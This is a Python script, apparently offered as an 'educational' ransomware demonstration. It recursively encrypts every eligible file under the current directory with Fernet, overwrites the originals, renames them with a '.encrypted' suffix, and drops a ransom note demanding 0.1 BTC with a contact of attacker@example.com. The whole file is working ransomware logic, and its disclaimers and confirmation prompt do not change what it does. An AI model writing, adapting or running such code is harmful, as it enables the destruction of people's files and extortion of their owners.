import os
import logging
from cryptography.fernet import Fernet
from datetime import datetime
import platform

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    filename='encryption_demo.log'
)

class Encryption:
    def __init__(self):
        self.system = platform.system()
        self.script_name = os.path.basename(__file__)
        self.critical_paths = self._get_critical_paths()
        self.skipped_extensions = {'.py', '.exe', '.dll', '.sys', '.encrypted'}
        
    def _get_critical_paths(self):
        """Get system-specific critical paths"""
        if self.system == 'Windows':
            return [
                "C:\\Windows", "C:\\Program Files", "C:\\Program Files (x86)",
                "C:\\ProgramData", "C:\\Users\\Default", "C:\\Users\\Public",
                "C:\\System Volume Information", "C:\\$Recycle.Bin"
            ]
        else:  # Linux/Unix
            return [
                "/bin", "/boot", "/dev", "/etc", "/lib", "/lib64", "/proc",
                "/run", "/sbin", "/sys", "/usr", "/var", "/root"
            ]

    def is_safe_to_encrypt(self, filepath):
        """Check if a file is safe to encrypt"""
        # Skip critical system files
        if any(os.path.abspath(filepath).startswith(os.path.abspath(path)) for path in self.critical_paths):
            return False
            
        # Skip certain file extensions
        if any(filepath.lower().endswith(ext) for ext in self.skipped_extensions):
            return False
            
        # Skip the script itself
        if filepath == self.script_name:
            return False
            
        # Skip if file is already encrypted
        if filepath.endswith('.encrypted'):
            return False
            
        return True

    def generate_key(self):
        """Generate a key for encryption/decryption"""
        try:
            key = Fernet.generate_key()
            logging.info("Encryption key generated successfully")
            return key
        except Exception as e:
            logging.error(f"Error generating key: {e}")
            raise

    def encrypt_file(self, filepath, key):
        """Encrypt a single file with error handling"""
        try:
            # Check file size (skip files larger than 100MB)
            if os.path.getsize(filepath) > 100 * 1024 * 1024:
                logging.warning(f"Skipping large file: {filepath}")
                return False

            with open(filepath, 'rb') as f:
                data = f.read()
            
            fernet = Fernet(key)
            encrypted = fernet.encrypt(data)
            
            with open(filepath, 'wb') as f:
                f.write(encrypted)
                
            # Rename file to show it's encrypted
            os.rename(filepath, filepath + '.encrypted')
            logging.info(f"Successfully encrypted: {filepath}")
            return True
            
        except PermissionError:
            logging.warning(f"Permission denied for file: {filepath}")
            return False
        except Exception as e:
            logging.error(f"Error encrypting {filepath}: {e}")
            return False

    def encrypt_directory(self, directory, key):
        """Encrypt files in a directory with safety checks"""
        try:
            # Validate directory exists
            if not os.path.exists(directory):
                logging.error(f"Directory does not exist: {directory}")
                return

            # Get list of files to encrypt
            files_to_encrypt = []
            for root, _, files in os.walk(directory):
                for file in files:
                    filepath = os.path.join(root, file)
                    if self.is_safe_to_encrypt(filepath):
                        files_to_encrypt.append(filepath)

            # Log number of files to be encrypted
            logging.info(f"Found {len(files_to_encrypt)} files to encrypt")

            # Encrypt files
            encrypted_count = 0
            for filepath in files_to_encrypt:
                if self.encrypt_file(filepath, key):
                    encrypted_count += 1

            logging.info(f"Successfully encrypted {encrypted_count} files")
            return encrypted_count

        except Exception as e:
            logging.error(f"Error in encrypt_directory: {e}")
            return 0

    def create_ransom_note(self, directory, key):
        """Create a formatted ransom note"""
        try:
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            note = f"""YOUR FILES HAVE BEEN ENCRYPTED!

Date: {timestamp}
System: {self.system}

To decrypt your files, you need to provide this key:
{key.decode()}

Contact: attacker@example.com
Payment: 0.1 BTC

WARNING: This is a demonstration. Do not pay any ransom.
"""
            note_path = os.path.join(directory, 'READ_ME_RANSOM.txt')
            with open(note_path, 'w') as f:
                f.write(note)
            logging.info(f"Ransom note created at: {note_path}")
            return True
        except Exception as e:
            logging.error(f"Error creating ransom note: {e}")
            return False

def main():
    print("WARNING: This isnt fully tested ran in sandboxed environment .")
    print("Do not run this on any system with important files.")
    print("This code is for educational purposes only lol..")
    
    # Create enc instance
    enc = Encryption()
    
    # Get user confirmation
    confirm = input("Do you want to proceed with the demonstration? (yes/no): ")
    if confirm.lower() != 'yes':
        print("Operation cancelled.")
        return
    
    try:
        # Use current directory for enc
        target_dir = os.getcwd()
        
        # Generate key
        key = enc.generate_key()
        print(f"Generated key: {key.decode()}")
        
        # Encrypt files
        encrypted_count = enc.encrypt_directory(target_dir, key)
        print(f"Encrypted {encrypted_count} files")
        
        # Create ransom note
        if enc.create_ransom_note(target_dir, key):
            print("Ransom note created successfully")
        
        print("\nSimulation complete. Again, DO NOT USE THIS MALICIOUSLY.")
        
        
    except Exception as e:
        logging.error(f"Error in main execution: {e}")
        print(f"An error occurred: {e}")

if __name__ == "__main__":
    main()